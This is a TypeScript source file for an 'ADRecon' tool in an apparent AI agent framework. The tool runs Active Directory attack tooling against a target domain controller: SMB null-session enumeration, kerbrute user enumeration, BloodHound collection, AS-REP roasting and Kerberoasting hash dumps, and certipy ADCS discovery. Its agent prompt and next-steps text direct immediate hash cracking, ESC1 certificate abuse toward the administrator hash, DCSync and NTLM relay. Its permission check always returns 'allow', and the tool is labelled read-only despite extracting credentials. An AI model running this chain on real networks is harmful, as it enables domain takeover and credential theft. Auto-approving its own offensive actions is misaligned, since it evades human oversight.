import { join } from 'path'
import { z } from 'zod/v4'
import { buildTool, type ToolDef, type ToolUseContext } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { ensureOutputDir, resolveAuth, runADCommand } from '../shared/adUtils.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

export const AD_RECON_TOOL_NAME = 'ADRecon'

const inputSchema = lazySchema(() =>
  z.strictObject({
    action: z
      .enum(['smb_enum', 'user_enum', 'bloodhound_collect', 'asreproast_enum', 'kerberoast_enum', 'adcs_enum'])
      .describe(
        'smb_enum=NXC SMB discovery (hosts/shares/signing/null-session), user_enum=kerbrute user enumeration or ldapdomaindump (with creds), bloodhound_collect=BloodHound graph collection, asreproast_enum=find AS-REP roastable accounts, kerberoast_enum=find Kerberoastable SPNs, adcs_enum=certipy certificate template enumeration',
      ),
    dc_ip: z.string().describe('Domain Controller IP address'),
    domain: z.string().describe('AD domain FQDN (e.g. "contoso.local")'),
    username: z.string().optional().describe('Username for authenticated enumeration'),
    password: z.string().optional().describe('Cleartext password'),
    nt_hash: z.string().optional().describe('NT hash for pass-the-hash (format: LMHASH:NTHASH or just 32-char NT hash)'),
    wordlist: z
      .string()
      .optional()
      .describe('Wordlist path for user_enum with kerbrute (default: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt)'),
    timeout_secs: z.number().int().min(30).max(3600).default(180).describe('Timeout in seconds (default: 180)'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    success: z.boolean(),
    action: z.string(),
    command: z.string(),
    stdout: z.string(),
    stderr: z.string(),
    output_dir: z.string().optional(),
    next_steps: z.string().optional(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

async function runADRecon(input: z.infer<InputSchema>, context: ToolUseContext): Promise<Output> {
  const outputDir = await ensureOutputDir(input.domain, 'ad-recon')
  const { hash, hasAuth } = resolveAuth(input.username ?? '', input.password ?? '', input.nt_hash)
  const userArg = input.username ?? ''
  const passArg = input.password ?? ''

  let binary: string
  let args: string[]
  let description: string
  let nextSteps: string | undefined

  switch (input.action) {
    case 'smb_enum': {
      binary = '/usr/sbin/nxc'
      args = ['smb', input.dc_ip, '--no-bruteforce']
      if (hasAuth) {
        args.push('-u', userArg)
        if (hash) args.push('-H', hash)
        else args.push('-p', passArg)
        args.push('--shares', '--users', '--groups', '--pass-pol')
      } else {
        args.push('-u', '', '-p', '', '--shares')
      }
      description = `NXC SMB enum: ${input.dc_ip} (${input.domain})`
      break
    }
    case 'user_enum': {
      if (hasAuth) {
        binary = '/usr/sbin/ldapdomaindump'
        args = ['-u', `${input.domain}\\${userArg}`]
        if (hash) args.push('--hashes', hash)
        else args.push('-p', passArg)
        args.push(`ldap://${input.dc_ip}`, '-o', outputDir, '--no-html')
        description = `ldapdomaindump: ${input.domain}`
      } else {
        const wordlist = input.wordlist ?? '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
        binary = '/usr/sbin/kerbrute'
        args = ['userenum', '--dc', input.dc_ip, '-d', input.domain, wordlist, '-o', join(outputDir, 'kerbrute-users.txt')]
        description = `Kerbrute user enum: ${input.domain}`
      }
      break
    }
    case 'bloodhound_collect': {
      if (!hasAuth) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'bloodhound_collect requires username + password or nt_hash' }
      }
      binary = '/usr/sbin/bloodhound-python'
      args = ['-d', input.domain, '-u', userArg, '-dc', input.dc_ip, '-ns', input.dc_ip, '-c', 'All', '--zip', '-o', outputDir]
      if (hash) args.push('--hashes', hash)
      else args.push('-p', passArg)
      description = `BloodHound collection: ${input.domain}`
      break
    }
    case 'asreproast_enum': {
      binary = '/usr/sbin/GetNPUsers.py'
      args = [`${input.domain}/`]
      if (hasAuth) {
        args.push('-u', userArg)
        if (hash) args.push('-hashes', hash)
        else args.push('-p', passArg)
      } else {
        args.push('-no-pass', '-usersfile', '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt')
      }
      args.push('-dc-ip', input.dc_ip, '-outputfile', join(outputDir, 'asrep-hashes.txt'), '-format', 'hashcat')
      description = `AS-REP roast enum: ${input.domain}`
      break
    }
    case 'kerberoast_enum': {
      if (!hasAuth) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'kerberoast_enum requires valid credentials' }
      }
      binary = '/usr/sbin/GetUserSPNs.py'
      args = [`${input.domain}/${userArg}`]
      if (hash) args.push('-hashes', hash)
      else args.push('-p', passArg)
      args.push('-dc-ip', input.dc_ip, '-outputfile', join(outputDir, 'kerberoast-hashes.txt'))
      description = `Kerberoast enum: ${input.domain}`
      break
    }
    case 'adcs_enum': {
      if (!hasAuth) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'adcs_enum requires valid credentials' }
      }
      binary = '/usr/sbin/certipy'
      args = ['find', '-u', `${userArg}@${input.domain}`]
      if (hash) args.push('-hashes', hash)
      else args.push('-p', passArg)
      args.push('-dc-ip', input.dc_ip, '-vulnerable', '-stdout')
      description = `Certipy ADCS enum: ${input.domain}`
      nextSteps = `If ESC1/ESC3 found (EnrolleeSuppliesSubject=True or similar):\n  ADAttackTool action=adcs_exploit dc_ip="${input.dc_ip}" domain="${input.domain}" username="${userArg}" password="${passArg}" ca_name=<CA_NAME> template=<TEMPLATE_NAME> upn=administrator@${input.domain}\n  After getting cert: certipy auth -pfx adcs-cert.pfx -dc-ip ${input.dc_ip}\n  This retrieves NTLM hash of administrator → DCSync with ADAttackTool action=dcsync\n\nIf ESC8 found (HTTP enrollment endpoint):\n  ADAttackTool action=relay_setup relay_type=adcs → ntlmrelayx + coerce → certificate → authenticate`
      break
    }
  }

  const command = `${binary} ${args.join(' ')}`
  const { stdout, stderr, code } = await runADCommand({
    binary, args, description,
    timeoutMs: input.timeout_secs * 1000,
    context,
  })

  return {
    success: code === 0,
    action: input.action,
    command,
    stdout,
    stderr,
    output_dir: outputDir,
    ...(nextSteps && { next_steps: nextSteps }),
    ...(code !== 0 && { error: `Exit code ${code}` }),
  }
}

export const ADReconTool = buildTool({
  name: AD_RECON_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'active directory recon — NXC SMB enumeration, BloodHound collection, kerbrute user enum, AS-REP/Kerberoast SPN discovery, ADCS template enumeration with certipy',
  maxResultSizeChars: 30_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    if (i.action && i.domain) return `AD Recon: ${i.action} on ${i.domain}`
    return 'Active Directory reconnaissance'
  },
  async prompt() {
    return `Active Directory enumeration suite. Use when given a DC IP and domain name.

### Recommended sequence (run in order):
1. smb_enum — null session or auth'd SMB: hosts, shares, signing status (signing off = relay candidate)
2. user_enum — kerbrute (no creds) or ldapdomaindump (with creds) for full user/group listing
3. bloodhound_collect — full AD graph (requires creds) → feed to ChainTool bloodhound-path for DA path
4. asreproast_enum — AS-REP roastable accounts → crack with hashcat -m 18200
5. kerberoast_enum — SPN accounts (requires any creds) → crack with hashcat -m 13100
6. adcs_enum — certipy: ESC1/ESC3/ESC8 templates → IMMEDIATE ADAttackTool adcs_exploit if found

### Priority signals from results:
- SMB signing disabled → setup NTLM relay (ADAttackTool relay_setup)
- AS-REP hash found → HashTool crack immediately (fast wordlist first)
- Kerberoast hash found → HashTool crack (same)
- ADCS ESC1/ESC3/ESC8 found → ADAttackTool adcs_exploit FIRST (overrides everything else)
Output saved to ~/Targets/<domain>/ad-recon/`
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `ADRecon:${i.action}` : 'ADRecon'
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `adrecon ${i?.action ?? ''} ${i?.dc_ip ?? ''} ${i?.domain ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  async call(input, context) {
    const result = await runADRecon(input as z.infer<InputSchema>, context)
    return { data: result }
  },
  mapToolResultToToolResultBlockParam(data: Output, toolUseID) {
    const lines: string[] = [
      `ADRecon: ${data.action} — ${data.success ? 'OK' : 'FAILED'}`,
      `Command: ${data.command}`,
      data.output_dir ? `Output: ${data.output_dir}` : '',
      '',
    ]
    if (data.error) lines.push(`Error: ${data.error}`, '')
    if (data.stdout) lines.push('--- stdout ---', data.stdout)
    if (data.stderr) lines.push('--- stderr ---', data.stderr)
    if (data.next_steps) lines.push('', '--- next steps ---', data.next_steps)
    return {
      tool_use_id: toolUseID,
      type: 'tool_result' as const,
      content: lines.filter(l => l !== undefined).join('\n'),
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i.action && i.domain ? `AD recon: ${i.action} ${i.domain}` : 'AD recon'
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i.action && i.domain ? `${i.action}: ${i.domain}` : 'ad-recon'
  },
  renderToolResultMessage,
} satisfies ToolDef<InputSchema, Output>)
